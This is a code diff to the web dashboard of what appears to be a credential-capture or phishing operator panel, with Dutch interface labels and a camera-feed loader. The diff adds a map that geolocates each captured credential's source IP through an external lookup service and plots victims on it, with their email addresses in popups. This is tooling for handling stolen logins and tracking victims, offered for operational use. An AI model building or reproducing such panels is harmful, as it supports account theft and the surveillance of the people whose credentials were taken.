@@ -711,6 +711,7 @@ body[data-dark] .lightbox{background:rgba(0,0,0,.97)}
             </div>
         </div>
         <div id="credsSummaryBar"></div>
+        <div id="credGeoMap" style="height:220px;border-radius:8px;margin:0 0 10px;border:1px solid var(--border2);display:none;overflow:hidden;"></div>
         <div class="pnl-b np" id="cred-log"><div class="empty">No credentials captured yet</div></div>
     </div>
 </div>
@@ -2062,6 +2063,9 @@ function renderCredentials(creds) {
                 <td style="padding:7px 10px;"><button onclick="toggleReviewed(${credKey})" style="font-size:.6rem;padding:2px 7px;border-radius:4px;border:1px solid ${isReviewed ? '#34a853':'var(--border2)'};background:${isReviewed ? 'rgba(52,168,83,.15)':'var(--bg2)'};color:${isReviewed ? '#34a853':'var(--dim)'};cursor:pointer;">${isReviewed ? '✓ Bekeken' : '⬜ Markeer'}</button></td>
             </tr>`;}).join('')}
         </tbody></table>`;
+
+    // Render geo map for capture locations
+    renderCredGeoMap(creds);
 }
 
 async function clearCredentials() {
@@ -2077,6 +2081,58 @@ function toggleReviewed(credKey) {
         localStorage.setItem('_rev_creds', JSON.stringify([...set]));
         renderCredentials(window._lastCreds || []);
     } catch {}
+}
+
+let _credMap = null;
+
+async function renderCredGeoMap(creds) {
+    const mapDiv = document.getElementById('credGeoMap');
+    if (!mapDiv || !creds || creds.length === 0) { if (mapDiv) mapDiv.style.display = 'none'; return; }
+
+    // Collect unique IPs (skip private/loopback)
+    const ips = [...new Set(creds.map(cr => cr.ip).filter(ip => ip && !/^(127\.|10\.|192\.168\.|::1|localhost|undefined)/.test(ip)))].slice(0, 12);
+    if (ips.length === 0) { mapDiv.style.display = 'none'; return; }
+
+    mapDiv.style.display = 'block';
+
+    // Initialize or reset Leaflet map
+    if (_credMap) { _credMap.remove(); _credMap = null; }
+    _credMap = L.map(mapDiv, { zoomControl: true, attributionControl: false }).setView([20, 0], 2);
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+        maxZoom: 18, attribution: '© OpenStreetMap'
+    }).addTo(_credMap);
+
+    // Fetch geo for each unique IP
+    const geoResults = await Promise.allSettled(ips.map(ip =>
+        fetch(`https://ipapi.co/${ip}/json/`).then(r => r.ok ? r.json() : null)
+    ));
+
+    const bounds = [];
+    geoResults.forEach((res, i) => {
+        if (res.status !== 'fulfilled' || !res.value) return;
+        const geo = res.value;
+        if (!geo.latitude || !geo.longitude) return;
+        const lat = parseFloat(geo.latitude), lng = parseFloat(geo.longitude);
+        if (isNaN(lat) || isNaN(lng)) return;
+
+        // Count how many creds come from this IP
+        const ipCreds = creds.filter(cr => cr.ip === ips[i]);
+        const label = `<b>${geo.city || ''}${geo.city && geo.country_name ? ', ' : ''}${geo.country_name || ''}</b><br>
+            IP: ${ips[i]}<br>
+            ${ipCreds.length} opvang(en)<br>
+            ${ipCreds.map(cr => `<span style="font-size:11px">${cr.email || '?'}</span>`).join('<br>')}`;
+
+        const marker = L.circleMarker([lat, lng], {
+            radius: 7 + Math.min(ipCreds.length * 3, 12),
+            color: '#c5221f', fillColor: '#ea4335', fillOpacity: 0.75, weight: 2
+        }).addTo(_credMap).bindPopup(label);
+
+        bounds.push([lat, lng]);
+    });
+
+    if (bounds.length > 0) {
+        try { _credMap.fitBounds(bounds, { padding: [24, 24], maxZoom: 8 }); } catch (_) {}
+    }
 }
 
 async function loadCameraFeeds() {
